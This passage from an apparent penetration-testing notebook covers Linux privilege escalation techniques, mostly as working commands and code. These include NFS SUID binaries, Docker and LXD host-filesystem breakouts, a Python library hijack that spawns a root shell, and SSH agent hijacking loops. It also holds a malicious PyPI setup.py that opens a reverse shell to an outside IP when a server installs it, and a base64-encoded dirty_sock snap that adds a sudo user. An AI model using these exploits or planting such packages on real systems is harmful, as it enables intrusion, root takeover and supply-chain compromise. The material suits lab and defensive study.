    msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
    ```
5.  Set a SUID bit on the file and make it executable by anyone:

    ```
    chmod +xs /tmp/nfs/shell.elf
    ```
6.  To acquire a root shell on the target machine, run the following command:

    ```
    $ /tmp/shell.elf
    bash-4.1# id
    uid=1000(user) gid=1000(user) euid=0(root) egid=0(root)
    ```

## Container

### Docker

Enumerate the docker images:

```
docker ps
```

We can use an existing image to create a container and mount the root file system in the container:

```
docker run --rm -it -v /:/mnt username bash
cd /mnt/root/
```

Escalate privileges in the container:

```
cd /mnt/bin
chmod 4755 bash
exit
```

Escalate privileges in the host (not container):

```
bash -p
whoami

# Expected Output
root
```

#### Docker Group

First check what images we have available:

```
docker image ls
```

We can use the GTFObins command replacing the value `<alpine>` with one of the images listed above.

```
docker run -v /:/mnt --rm -it <THE_IMAGE_REPOSITORY_NAME> chroot /mnt sh
```

Returning a shell as root and navigate to /mnt:

```
cd /mnt
```

#### Docker Container

Listing everything inside the '/' directory shows a .dockerenv file. This combined with the hostname of `<ID>` means we are likely running inside a docker container.

Using the command `fdisk -l` we can list the hosts disks.

We can then create a directory and attempt to mount **/dev/sda1** to it so we can see if we can browse the hosts file system.

```
mkdir /mnt/own
mount /dev/sda1 /mnt/own
cd /mnt/own
ls /mnt/own/root
```

### &#x20;LXC/LXD

#### LXD Abuse

Enumerate the group of the current user:

```bash
groups
# output
lxd
```

The lxd (Linux Daemon) is a system container manager, that controls lxc (Linux Container). Linux Container (LXC) is a virtualization technology that runs isolated containers using a single Linux kernel. It is possible for the user ash to create a privileged container and then use it to mount the host filesystem. To achieve this, we can download an Alpine image, and then upload it to the remote machine. Let's download and build the image locally. The image can be found here.

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder/
./build-alpine
```

A compressed file alpine-\*\*\*\*\*\*\*\*.tar.gz is created. Then download the file to the target machine. On the remote machine, run the following to initiate lxd, inputting no to all prompts.

```bash
lxd init
```

Next, we run the following command to import the alpine image.

```bash
lxc image import ./alpine-v3.12-x86_64-20201106_2000.tar.gz --alias alpine
```

To check if the image is successfully imported, type the following.

```bash
lxc image list
```

Next, we need to make the container privileged, and mount the filesystem, before starting the container.

```bash
lxc init alpine mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root
recursive=true
lxc start mycontainer
```

Once the container is started, we can access it by typing the following command.

```bash
lxc exec mycontainer /bin/sh
```

## Network

### Port Forwarding

A root process may be tied to a port listening only on localhost. If an attack cannot be launched locally on the target machine for some reason, the port can be forwarded to your local machine:

{% embed url="https://nozerobit.gitbook.io/hacknotes/port-redirection-and-tunneling/port-redirection" %}

## Misc

### tmux

If there's a session running as root, then we may be able to escalate our privileges:

```
hype@Valentine:~$ ps -ef | grep tmux
root       1022      1  0 Jul25 ?        00:00:54 /usr/bin/tmux -S /.devs/dev_sess
```

Connect to the session:

```
tmux -S /.devs/dev_sess
```

### Python Path Hijacking

{% embed url="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/" %}

We are going to see an example with python since it is an error that already comes by default and is the following:

![](<../.gitbook/assets/image (29).png>)

If we import the **sys** library and make a print of the path we see that in order of priorities the current directory is found first, so we can take advantage of that so that even if we do not have permissions in a __ python script that you have created if we can import a library which we inject malicious code.

Suppose we have the file **example.py** in which the following exists:

`import hashlib`&#x20;

If we do a locate of hashlib we see that it is in the following path:

`/usr/lib/python2.7/hashlib.py`&#x20;

And as we see in the first image, that route is in the second position. There may be several cases:

* That the _hashlib_ is not in the second position, but that we have writing capacity in the path /usr/lib/python2.7 '' which should not have it. Well, thanks to that, we would now be doing a library hijacking (hashlib.py), there we could define the instructions we want and execute in the system and therefore, we would alter the flow of a program that imports this library because now it would take ours.

Let's see it with an example:

```python
#!/usr/bin/python

import hashlib

word='hello'
md5=hashlib.md5(word).hexdigest()
print(md5)
```

We have the file **example.py** that it imports from the hashlib library. As we have seen above, the **PATH** pulls the current directory from the job. It is the case that _we do not have write permissions_ on the file _example.py_ but **we do** from the current working directory.

We can create a file called _hashlib.py_ with the following content:

```python
import os

os.setuid(0)
os.system(“/bin/bash”)
```

Running this script should result in a privilege escalation since we're running a module that sets our UID bit to 0 (root) and spawns a bash shell:

```bash
python example.py
```

Thanks to [@sh0x](https://twitter.com/T0N1sm) for giving me some notes.

### PyPi

If the service pypi has an external connection we can follow the steps below in our host (kali):

```
mkdir pypi
cd !$
mkdir pwned
cd !$
touch __init__.py
touch setup.py
```

The file **\_\_init\_\_**.py will be empty and the code of the **setup.py** is the following:

```python
import setuptools
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.205",443)) # YOUR IP and YOUR PORT
os.dup2(s.fileno(),0) 
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

setuptools.setup(
    name="example-pkg-YOUR-USERNAME-HERE",
    version="0.0.1",
    author="Example Author",
    author_email="author@example.com",
    description="A small example package",
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires=">=3.6",
)
```

The idea here is that when the pypi server **executes** the **setup.py**, we want it to initiate a **reverse shell**.

We configure our host to be able to send the package to the victim repository:

```bash
rm ~/.pypirc
vi ~/.pypirc
```

The content of the file .pypirc will be:

```python
[distutils]
index-servers = remote

[remote]
repository = http://pypi.sneakycorp.htb:8080
username = pypi
password = soufianeelhaoui
```

Now we can send it to the target machine.

We set a listener on port 443:

```
nc -nlvp 443
```

We send the package to the pypi server:

```bash
python3 setup.py sdist upload -r remote
```

Remember that we set a listener on port 443 and we should get a reverse shell as soon as the server executes the file **setup.py**:

```
nc -nlvp 443
```

After we receive a reverse shell, see the new user:

```
whoami
```

### Snap

Search for snap hook exploit .snap file and we can find the following link [Linux Privilege Escalation via snapd (dirty\_sock exploit)](https://initblog.com/2019/dirty-sock/).&#x20;

```
echo "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" | xargs | tr -d ' '
```

Copy the output and recreate the package:

```
cd /tmp
pytho -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD
//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29
jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1
EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2Q
gLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N
1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciB
leHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiA
gJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAA
BaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3F
qfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4
wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRj
NEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPt
vjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAA
AAAAAPgMAAAAAAAAEgAAAAACAA" + "A"*4256 + "=="' | base64 -d > evil.snap

sudo /usr/bin/snap install evil.snap --devmode
cat /etc/passwd
sudo dirty_sock > password dirty_sock
sudo su > password dirty_sock

whoami
# Expected Output
root
```

### Git Repositories

We can find git repositories with:

```
find \-type f 2>/dev/null | grep ".git"
```

Sometimes, you will be able to see folders that contain a `.git` folder in them. That means that the folder is a git repository. **GIT** saves all the history of defiles changes, as an attacker, we can enumerate and see if developers have made mistakes.

```
git log
```

Sometimes some logs may be hidden, for this we can use reflog:

```
git reflog
```

We can use the parameter `-p` to look at the differences made in a commit:

```
git log -p <ID>
```

Alternatively, we can use diff:

```
git diff <ID>
```

Alternatively, we can just go to the .git/log directory and do something like the following:

```bash
for i in $(cat HEAD | awk -F " " '{print $1}' ); do git show $i | grep passw | awk -F '=' '{print $NF}'; done 2>/dev/null
```

### SSH Agent Hijacking

We need to set the environment variable SSH\_SOCK\_AUTH to the agent file, and then just ssh:

```bash
while true; do
    export pid=$(ps -u kaneki_adm | grep ssh$ | tr -s ' ' | cut -d' ' -f2);
    if [ ! -z $pid ]; then
        echo "[+] Found pid for kaneki_adm ssh process: $pid";
        export SSH_AUTH_SOCK=$(su kaneki_adm -c 'cat /proc/${pid}/environ' | sed 's/\x0/\n/g' | grep SSH_AUTH_SOCK | cut -d'=' -f2);
        echo "[+] Found ssh auth socket: $SSH_AUTH_SOCKET";
        echo "[*] sshing to target";
        ssh root@172.18.0.1 -p 2222;
        break;
    fi;
    sleep 5;
done
```

Alternative script:

```bash
#!/bin/bash
cd /tmp/ssh-*
export SSH_AUTH_SOCK=$PWD/$(ls)
#ssh-add -l
#ssh-add -1
ssh root@172.10.0.1 -p 2222
```

Alternative one-liner:

```bash
while true; do a=$(ls /tmp/ssh-*/agent.*); export SSH_AUTH_SOCK=$a; ssh root@172.18.0.1 -p 2222; done 2>/dev/null
```

### Gosu

An easy privilege escalation vector is:

```
gosu root bash
```

### Decode VNC Password

VNC Passwords in a file are stored obfuscated, but they can be broken. There’s a bunch of scripts out there to return the plain text. We can use [this one](https://github.com/trinitronx/vncpasswd.py), running the python and using `-d` for decrypt, and `-f secret` to point it at our file.

```
root@kali:~/hackthebox/poison-10.10.10.84# python /opt/vncpasswd.py/vncpasswd.py -d -f secret
Cannot read from Windows Registry on a Linux system
Cannot write to Windows Registry on a Linux system
Decrypted Bin Pass= 'VNCP@$$!'
Decrypted Hex Pass= '564e435040242421'
```





